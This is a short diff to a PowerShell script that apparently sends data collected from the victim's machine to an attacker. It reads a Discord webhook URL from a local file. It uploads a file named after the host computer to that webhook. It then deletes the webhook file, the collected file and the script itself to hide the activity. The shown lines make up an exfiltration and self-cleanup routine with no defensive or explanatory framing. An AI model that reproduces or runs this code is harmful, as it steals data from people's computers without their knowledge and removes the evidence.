@@ -1,5 +1,5 @@
 ## Get Webhook link from other file
-param([string] $Webhook)
+$Webhook = Get-Content ./webhook
 
 function upload_discord {
 
@@ -50,5 +50,6 @@ Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -
 upload_discord("$env:computername.fk")
 
 ## Self Delete
+Remove-Item ./webhook
 Remove-Item ./"$env:computername.fk"
 Remove-Item $PSCommandPath -Force 
